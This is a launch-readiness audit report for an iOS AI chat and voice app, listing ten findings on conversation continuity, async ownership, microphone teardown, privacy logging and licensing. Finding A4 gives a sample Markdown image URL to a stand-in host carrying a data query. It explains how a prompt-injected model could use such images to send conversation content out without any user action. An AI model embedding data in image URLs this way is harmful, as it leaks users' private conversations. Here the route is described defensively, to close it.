**Talaria-27 — launch-readiness audit**

September 4, 2026 • Read-only repository audit • Report only

**Recommendation: address the high-priority findings before public launch.** The app has substantial engineering safeguards, a working Release build, and extensive regression coverage. The remaining risks are concentrated in conversation continuity, asynchronous ownership, microphone shutdown, and content-driven network access. These are consequential enough that a green build alone should not be treated as launch clearance.

Audited revision: `5485ec8ef14edf52ae22834ce95396662900624d`. The local checkout and GitHub `main` matched when checked. No repository files, commits, settings, or live Hermes installations were changed. Build products and logs were written outside the repository; this report is also outside it.

**How to read this report**

P1 means I recommend resolving it before public launch. P2 means a material defect or release requirement to resolve or explicitly accept. P3 means a lower-priority improvement. “Source-confirmed” means the relevant path and conditions were traced in current code; it does not mean the scenario was reproduced on a physical device. The native microphone finding is specifically a timing risk established by source inspection, not a newly observed recording incident.

The ten findings below are followed by known open work, release checks, strengths, and verification limits. Tracker numbers refer to `OPEN_ITEMS`, not GitHub issue/PR numbers.

| ID | Priority | Finding | Evidence level |
|---|---|---|---|
| A1 | P1 | Transplanted context is removed from subsequent run history | Source-confirmed deterministic mapping |
| A2 | P1 | A late recovery response can modify a different conversation | Source-confirmed missing ownership check; timing reproduction needed |
| A3 | P1 | Native capture restart can outlive session shutdown | Source-confirmed lifecycle gap; hardware reproduction needed |
| A4 | P1 | Model-authored Markdown images trigger automatic external requests | Source-confirmed automatic network path |
| A5 | P2 | Dropped-run recovery resolves against the active host, not the run's host | Source-confirmed routing mismatch |
| A6 | P2 | Share extension accepts files the main app silently discards | Source-confirmed mismatched limits |
| A7 | P2 | Decode failures write response content to public diagnostic logs | Source-confirmed logging behavior |
| A8 | P2 | Privacy-policy deletion and third-party claims do not match behavior | Source/document comparison |
| A9 | P2 | Shipping bundle lacks an explicit third-party license-notice surface | Built-product and source inspection |
| A10 | P2 | Weather output lacks a reliable attribution mechanism | Source inspection against Apple's requirements |

**A1 — Transplanted context is lost before the next real run**

Evidence: [history construction](/Users/owenjones/Documents/Claude/Talaria-27/Talaria/Services/Live/SessionsHermesClient+RunsTransport.swift:967), [primer remapping](/Users/owenjones/Documents/Claude/Talaria-27/Talaria/Services/Live/SessionsHermesClient.swift:778), and [acknowledgment removal](/Users/owenjones/Documents/Claude/Talaria-27/Talaria/Services/Live/SessionsHermesClient.swift:740).

`fetchRunsHistory` obtains a conversation through the same mapping used for display. That mapping replaces a stored transplant primer with a short `.system` notice and collapses its following assistant acknowledgment. `runsHistory` then excludes system messages. The primer's actual content therefore does not reach the next run.

Trigger: build a conversation locally, switch into Hermes so a fresh hop receives a context transplant, then ask a question that depends on that earlier context. The setup run sees the primer, but subsequent runs construct history without it. The project's runs contract explicitly says runs write session history but do not read it themselves. Ordinary post-transplant exchanges still travel; the transplanted prehistory is what disappears.

Impact: a conversation can look continuous while the model has lost the context that made the transition meaningful. This is particularly difficult to diagnose because answers can remain plausible.

Recommendation: construct wire history from raw stored messages or another representation that retains model context. Apply primer hiding only to presentation. Add an integration test that feeds stored primer + acknowledgment + later turns through the actual history fetch and inspects the next POST body. Existing display and history-helper tests do not establish this composed contract. This crosses the #330 display change and runs transport; it is not a request to restore the retired sessions transport.

**A2 — Late run recovery can land in the wrong conversation**

Evidence: [recovery await and adoption](/Users/owenjones/Documents/Claude/Talaria-27/Talaria/Stores/ChatStore.swift:4207), [append into current conversation](/Users/owenjones/Documents/Claude/Talaria-27/Talaria/Stores/ChatStore.swift:4252), [walk-away cleanup](/Users/owenjones/Documents/Claude/Talaria-27/Talaria/Stores/ChatStore.swift:1965), and [foreground reconciliation task](/Users/owenjones/Documents/Claude/Talaria-27/Talaria/Stores/ChatStore.swift:4081).

A recovery pass awaits `resolveDroppedRun` and then adopts the result without rechecking conversation identity, pending-run identity, a generation token, or cancellation. `adoptRecoveredRun` appends into whichever `conversation` is current. Settlement also clears the current pending-run state and can resolve a held turn. Walking away cancels `reconcileTask`, but not the separately owned `reconcileInFlight` task.

Trigger: conversation A has a dropped run; foreground recovery starts a slow status request; the user opens B before A's response returns. The response can append A's answer or failure into B and perform settlement against B's current state. The reply's stable ID prevents duplicates of that reply; it does not prove the destination is correct.

Impact: cross-conversation content contamination, incorrect usage/state, and potentially incorrect handling of a queued message.

Recommendation: capture an ownership token including conversation and run identity before the await, then validate it before every mutation. Invalidate both recovery paths on walk-away. A cancellation request alone is insufficient. Test the ordering with a suspended mock status response, switch conversations, then release it; include the case where B has started another run.

**A3 — Native voice restart is not joined to shutdown**

Evidence: [restart task](/Users/owenjones/Documents/Claude/Talaria-27/Talaria/Services/Live/NativeVoicePipelineService.swift:335), [teardown](/Users/owenjones/Documents/Claude/Talaria-27/Talaria/Services/Live/NativeVoicePipelineService.swift:386), [capture startup suspension points](/Users/owenjones/Documents/Claude/Talaria-27/Talaria/Services/Live/NativeVoicePipelineService.swift:985), and [tap installation/engine start](/Users/owenjones/Documents/Claude/Talaria-27/Talaria/Services/Live/NativeVoicePipelineService.swift:1162).

Route/interruption recovery creates `restartTask`, which stops and then starts capture. Session teardown cancels capture consumption and turn tasks but neither cancels nor awaits `restartTask`. The capture actor's startup suspends for locale support, asset reservation, audio-format selection, and analyzer preparation. Its later tap installation/engine start has no session-generation check.

Trigger: a Bluetooth/audio route change starts capture recovery, then the user ends the session—or a covering lock causes shutdown—while startup is suspended. Teardown can finish before the old startup resumes. That old startup can subsequently reinstall the tap and attempt to start the engine. The event consumer's `isEndingSession` guard prevents processing events; it does not itself stop the microphone hardware.

Impact: risk of capture continuing or restarting while the UI reports an ended session. Actual behavior depends on the audio-session ordering and requires device verification. This is a distinct restart path from the already-fixed initial-start/App Lock races in #302/#415.

Recommendation: invalidate startup at shutdown, cancel/join the restart, and enforce generation validity inside the capture controller after suspension points and immediately before installing/starting capture. Test with controllably suspended startup, then verify on hardware with Bluetooth changes and the existing HOT/COLD capture instrumentation.

**A4 — Markdown images are an unconsented external-request channel**

Evidence: [accepted image URLs](/Users/owenjones/Documents/Claude/Talaria-27/Talaria/Core/MarkdownParser.swift:132), [automatic image loading](/Users/owenjones/Documents/Claude/Talaria-27/Talaria/Features/Chat/MarkdownContentView.swift:160), and [Markdown artifact rendering](/Users/owenjones/Documents/Claude/Talaria-27/Talaria/Features/Chat/FilePreviewSheet.swift:197).

Image syntax accepts arbitrary HTTP/HTTPS URLs, and rendering immediately creates `AsyncImage(url:)`. The surrounding button controls enlargement, not permission to fetch. This applies to model replies and Markdown file previews.

Trigger: an answer or artifact contains `![preview](https://example.invalid/pixel?data=...)`, using a reachable external domain in a real attack. A request happens when the image is rendered, even if the destination returns no valid image. If a manipulated model includes conversation information in that URL, those URL bytes leave the phone without another user action. The destination also receives ordinary connection metadata. This does not automatically disclose the gateway bearer key, and I did not demonstrate an exploit against a live service.

Impact: tracking and a potential prompt-injection exfiltration route. The careful HTML artifact network sandbox does not cover SwiftUI Markdown image loading. ATS is not a domain-consent policy: arbitrary HTTPS remains possible.

Recommendation: require an explicit external-image decision or a narrowly defined trusted-origin policy; handle redirects and private-network destinations deliberately. Test that unapproved Markdown image URLs produce zero network requests. Keep the HTML sandbox; extend the privacy model to every rendering path.

**A5 — Recovery loses the run's host binding**

Evidence: [recovery status request](/Users/owenjones/Documents/Claude/Talaria-27/Talaria/Services/Live/SessionsHermesClient+RunsTransport.swift:1317), [nil profile resolution](/Users/owenjones/Documents/Claude/Talaria-27/Talaria/Services/Live/SessionsHermesClient.swift:1441), and [session birth-host adoption](/Users/owenjones/Documents/Claude/Talaria-27/Talaria/Services/Live/SessionsHermesClient.swift:629).

Normal run submission captures the hop's profile and resolved endpoint. Dropped-run recovery instead calls `readRunStatus(runID:profileID:nil)` without that endpoint. Nil resolves to the active profile. The supplied session ID is used for usage indexing, not host selection. `PendingRunRecord` also has no profile field.

Trigger: continue a session born on host A while host B remains the active profile, then lose the stream and recover. The normal turn can correctly use A, but recovery asks B for A's run. A 404 on B is classified as “gone,” stopping useful recovery.

Impact: missing recovered answers and false claims that a host no longer has a run, specifically in supported multi-host flows.

Recommendation: retain the originating profile with the pending run and resolve recovery against it; freeze endpoint ownership for a live recovery attempt. Persist identity, not a second plaintext copy of the API key. Test with distinct A/B mock endpoints and both warm and cold recovery. This is the same invariant #285 protects for ordinary turn requests, missing at a different entry point.

**A6 — Share handoff can silently discard accepted files**

Evidence: [extension acceptance](/Users/owenjones/Documents/Claude/Talaria-27/TalariaShare/ShareViewController.swift:212), [20 MB envelope limit](/Users/owenjones/Documents/Claude/Talaria-27/TalariaShare/ShareInboxCore.swift:147), [main-app limits](/Users/owenjones/Documents/Claude/Talaria-27/Talaria/Models/PendingAttachment.swift:30), and [discard during draining](/Users/owenjones/Documents/Claude/Talaria-27/Talaria/Services/Support/ShareInboxDrainer.swift:53).

The extension checks whether a type is stageable and whether bytes fit the aggregate envelope budget. The app separately limits text to 350 × 1024 bytes and PDFs to 10 × 1024 × 1024 bytes. Failed conversion is logged, then the envelope is removed. There is no user-facing failed-item result.

Trigger: share a 12 MB PDF from Files, with no other attachments. It fits the extension's 20 MB budget but exceeds the app's PDF cap. A file-backed 1 MB text attachment has the analogous mismatch. The original file is not deleted; the accepted handoff is lost.

Recommendation: share the size policy as well as the type catalog, reject unsupported sizes before Send, and surface conversion failures instead of silently consuming them. Exercise extension acceptance through app draining at both size boundaries, including corrupt PDFs and aggregate limits.

**A7 — Error logs include unredacted session content**

Evidence: [session-list decode logging](/Users/owenjones/Documents/Claude/Talaria-27/Talaria/Services/Live/SessionsHermesClient.swift:577) and [transcript decode logging](/Users/owenjones/Documents/Claude/Talaria-27/Talaria/Services/Live/SessionsHermesClient.swift:668).

On a decoding error, the first 500 response bytes are emitted through `.error` with `privacy: .public`. These bytes can contain session titles, previews, or transcript text. This path is not confined to DEBUG or gated by verbose logging.

Trigger: a gateway response changes shape or contains an incompatible field while still carrying user content. Diagnostic collection then retains that content unredacted.

Recommendation: log status, route, decoding key path, and bounded structural metadata. Omit raw bodies from normal logs; any intentional content-bearing diagnostics should have explicit disclosure and redaction. Test with a recognizable sensitive canary in a malformed response. This is a local diagnostic exposure, not evidence of an analytics uploader.

**A8 — Privacy wording needs reconciliation with actual retention and networking**

Evidence: [deletion promise](/Users/owenjones/Documents/Claude/Talaria-27/docs/privacy.html:143), [third-party list](/Users/owenjones/Documents/Claude/Talaria-27/docs/privacy.html:130), and [deliberate Keychain rehydration](/Users/owenjones/Documents/Claude/Talaria-27/Talaria/Services/Support/UserDefaultsAppPersistenceStore.swift:135).

The policy says deleting the app removes everything local. The implementation deliberately preserves backend profile/pairing state in Keychain and rehydrates it after container removal. That retention is an intentional existing design; the blanket deletion promise is the mismatch. The “third parties, exhaustively” list also omits arbitrary image origins contacted by A4.

Recommendation: describe which credentials/profile data may survive uninstall and how to remove them through the app's actual controls. Describe external content fetches, or change that behavior first. Recheck the final policy against local chat, PCC, hosted chat, voice, images, Keychain, and backups. Do not change durable identity merely to make the current sentence true.

**A9 — Bundle third-party notices with the distributed app**

Evidence: [package attribution](/Users/owenjones/Documents/Claude/Talaria-27/THIRD_PARTY_LICENSES.md:12), [resource packaging](/Users/owenjones/Documents/Claude/Talaria-27/project.yml:107), and [bundled font declarations](/Users/owenjones/Documents/Claude/Talaria-27/project.yml:225).

The repository has a substantial third-party notice document, but it is outside the app resource tree. Inspection of the fresh Release app and embedded extensions found no license/OFL/acknowledgment-named files. I also found no in-app acknowledgment surface. Nine font files from Chakra Petch, Space Grotesk, and JetBrains Mono ship, but the repository notice document does not list these families. Examined font metadata names OFL and links to it rather than containing the full license text.

The font publishers provide redistribution notices: [Chakra Petch OFL](https://raw.githubusercontent.com/google/fonts/main/ofl/chakrapetch/OFL.txt), [Space Grotesk OFL](https://raw.githubusercontent.com/google/fonts/main/ofl/spacegrotesk/OFL.txt), and [JetBrains Mono OFL](https://raw.githubusercontent.com/JetBrains/JetBrainsMono/master/OFL.txt). Their terms address including copyright and license information with redistributed copies. The WebRTC notice already reproduced in this repo also addresses binary redistribution.

Recommendation: make the release's notices explicit and user-accessible, including fonts and the pinned WebRTC distribution's applicable notices. Verify the final archive contains them. This is a distribution-readiness gap, not a legal determination about every embedded binary metadata field.

**A10 — Weather attribution is not guaranteed by the implementation**

Evidence: [weather lookup and returned data](/Users/owenjones/Documents/Claude/Talaria-27/Talaria/Services/Live/DeviceTools/DeviceReadTools.swift:462) and [blanket no-attribution statement](/Users/owenjones/Documents/Claude/Talaria-27/THIRD_PARTY_LICENSES.md:205).

The weather tool returns conditions, temperatures, humidity, wind, and forecasts as ordinary model input. There is no corresponding deterministic Apple Weather attribution/link surface in the inspected app code. A model mentioning Apple occasionally would not establish that the displayed result always includes the required attribution. The notice document groups WeatherKit under “no attribution obligation,” which conflates using the framework with displaying its data.

[Apple's WeatherKit requirements](https://developer.apple.com/weatherkit/#attribution-requirements) describe attribution for displayed weather data and a separate rule for transformed value-added products. The latter also requires attribution; ordinary answers exposing the original temperature/forecast should not simply be assumed exempt.

Recommendation: add a reliable attribution mechanism tied to weather-derived output, and review the voice-only presentation as well. Correct the blanket statement. Verify the exact shipped experience against Apple's requirements rather than delegating compliance to generated prose.

**Known work that remains relevant to launch**

These are existing tracked matters, not ten additional discoveries or instructions to re-open completed work.

- **#425-D: offline history still appears empty until the host timeout.** The current router fetches local rows before awaiting the host, but does not publish the local rows until that await ends. The latest tracker records the device experience failing at about 20 seconds and a scheduled follow-up. Prioritize this: an offline-first app must not initially look as though it lost all local history. Evidence: [router](/Users/owenjones/Documents/Claude/Talaria-27/Talaria/Services/Support/ChatBackendRouter.swift:645), [current item](/Users/owenjones/Documents/Claude/Talaria-27/OPEN_ITEMS.md:12325). The same entry records partial-host snapshot replacement and a search fallback that loses the unresumable flag; keep those in the multi-host acceptance matrix.
- **#302/#415: device confirmation of microphone/App Lock fixes remains important.** The fixes exist; this report does not label them unimplemented. Close their actual device bars and include A3's restart ordering.
- **#312 and #398-B: continuity and current-runtime device checks.** Simulator success cannot establish on-device FoundationModels generation behavior. A1 makes an actual backend-transition conversation especially important.
- **#340/#392: device-tool honesty.** Recent reminder-date work exists; do not reason from their old headings alone. Validate the current build for dates/times actually saved, the confirmation card, and accurate narration after declining an action. Retain explicit device results rather than inferring them from parser tests.
- **Voice acceptance remains broader than launch/capture success.** Include realtime self-barge-in, genuine user interruption, audio route changes, background/foreground, and the post-fix playback-duration result (#138/#198A/#198B/#419 and related entries). Name the engine and runtime in each result.
- **#127 monetization is deliberately dormant.** `MonetizationConfiguration.isEnabled` remains false. This is not a broken entitlement check. If launch is paid, product configuration, purchase/restore/revocation/offline validation, and the deliberate enabling change remain release work. If launch is free, keep copy consistent with that choice.

**Release and maintainability improvements**

1. **Make one release-candidate record authoritative.** Pin app commit, build number, toolchain/SDK, physical runtime, gateway version/process provenance, plugin release, and actual acceptance results. Separate “implemented,” “simulator passed,” and “device passed.” The tracker is rich but its supersession-heavy headings make this expensive to reconstruct.
2. **Add automated build/test checks to the repository workflow.** No tracked GitHub Actions workflow was present; the recent Actions runs inspected were Pages deployments. A green GitHub indicator therefore is not evidence of an iOS build. The local gate is valuable; make it a reproducible merge/release check on a runner with the required toolchain. Branch-protection configuration was not inspected, so I am not claiming it is absent.
3. **Reduce integration blind spots.** Add contract tests across raw server transcript → history request, extension acceptance → app drain, and asynchronous operation → destination ownership. Existing tests are numerous, but several findings arise where separately tested units are composed.
4. **Retire the ten distinct source warning locations from the Release build.** They include capture-ownership diagnostics in ModelsSettingsScreen, a captured mutable `activeTalariaLink`, deprecated local error helpers, and unused voice variables. These are maintenance signals, not ten confirmed runtime bugs. Review concurrency warnings first; avoid merely suppressing them.
5. **Refresh first-time-user documentation.** README architecture prose/diagram and legacy instructions contain inconsistent accounts of whether the relay is still called. It also describes an alpha with no TestFlight/App Store distribution. Reconcile the published setup path, screenshots, supported devices, and actual release channel at launch. Retired relay/connector hardening is not recommended.
6. **Verify the signed distribution artifact and review experience.** A simulator build does not prove App Store provisioning, PCC capability distribution, final archive validation, App Privacy answers, purchases, screenshots, or reviewer access to optional hosted functionality. Perform these against the chosen release candidate. This audit did not inspect App Store Connect or deploy a public review host.
7. **Run a focused accessibility and hardware acceptance pass.** Source contains explicit labels for important composer controls, but source inspection cannot certify VoiceOver navigation, largest text sizes, focus through approval sheets, contrast across all themes, iPad layouts, or microphone behavior. Include unsupported/local-model-unavailable devices and denied permissions. Do not infer hardware coverage from the deployment target alone.
8. **Publish the supported host/plugin compatibility boundary.** The active plugin is maintained outside the tracked app repository. The app's readiness depends on it, but this audit did not review the external plugin implementation or probe production hosts. Release notes should identify the tested combination and setup/update path.

**What is already strong**

- The runs transport captures endpoints for ordinary turns, separates reasoning from answers, and models terminal recovery outcomes explicitly. The findings identify places that do not yet carry those invariants all the way through.
- HTML previews have an explicit network blocker, fail-closed construction, and tests using real WebKit plus a control. A4 is a separate rendering surface, not evidence that this HTML work is ineffective.
- Credentials use Keychain and profiles have deliberate durable identity. Sensitive persistence is not casually placed in a new plaintext credential file.
- Privacy manifests exist for the app, widgets, and share extension and were present in the fresh Release products. All three built products agreed on version `1.0.0`, build `1`, and minimum OS `27.0`.
- The gate requires positive success evidence and tests its own failure classifier, including Swift Testing and XCTest shapes. Its self-tests passed during this audit.
- The project explicitly records accepted tradeoffs, retired paths, counterexamples, and device-only limits. That makes it possible to distinguish a new defect from an old, intentionally closed decision.
- The tracked Swift package resolution pins WebRTC to `130.0.0`; there is no large, opaque app dependency graph in the inspected project definition.

**Verification performed and limitations**

- Inventory: 1,272 tracked files, including 556 Swift files; 217 files under TalariaTests and five under TalariaUITests. These are inventory counts, not claims of line-by-line coverage or executed test counts.
- Confirmed local HEAD matched GitHub main through the GitHub API. The browser's GitHub rendering was cached, so it was not used to infer current source state.
- Fresh Release simulator build using Xcode-beta6, isolated DerivedData, disabled automatic package resolution, and signing disabled: **BUILD SUCCEEDED**, process exit 0. [Build log](/private/tmp/talaria-launch-audit-release.log).
- Built-product inspection: app plus both extensions contain privacy manifests and matching versions. No explicit license/OFL/acknowledgment files were found in those products.
- Existing focused Swift tests: **93 tests in eight suites passed; TEST SUCCEEDED, process exit 0**, on the separate CC-lane-1 simulator, runtime build `24A5423a`. The simulator was back in its original shutdown state at closeout. Suites: RunStatusRecoveryTests, RunsHistoryMappingTests, NativeVoicePipelineTests, ShareInboxCoreTests, ShareInboxDrainTests, HTMLArtifactSandboxTests, PrivacyManifestCompletenessTests, and PrivacyManifestBuiltProductTests. These existing suites do not reproduce the newly identified failure orderings; their success does not refute the source findings. No new regression tests or source mutations were added. [Test log](/private/tmp/talaria-launch-audit-tests.log).
- Tooling self-tests: tracker invariants **54 checks passed**; runtime-era scorer **55 checks passed**; decline-attribution scorer **7 behavior checks plus parity across 48 phrases passed**; gate classifier **86 checks passed**; pre-OTA sequencing self-test **passed**. Missing historical log fixtures were reported as skipped; embedded fixtures still ran.
- A limited scan of tracked text files found no matches for the private-key block, GitHub token, OpenAI-style token, and AWS access-key patterns used. This was not a comprehensive secret scan, did not establish validity of arbitrary credentials, and did not examine full Git history.
- No complete unit/UI gate, physical-device acceptance pass, performance profile, live gateway/plugin test, purchase round-trip, or signed distribution validation was performed for this audit. Another task was already exercising the UI bundle; its results are not claimed as audit results.
- Source review covered selected high-risk paths across transport/recovery, persistence, voice lifecycle, sharing, content rendering, configuration, privacy, release packaging, and tests. This is not a claim that every line or every dependency was audited. No live OJAMD state is inferred from repository notes.

**Recommended order of work**

Resolve A1–A4 first, with regression tests that exercise the complete paths. Address A5–A7 and the known offline-shelf delay before broad beta distribution. Reconcile A8–A10, notices, onboarding copy, and the release record before submission. Then run the full gate and the named device scenarios against the same release candidate, recording any consciously accepted residuals.

No fixes were made as part of this audit.
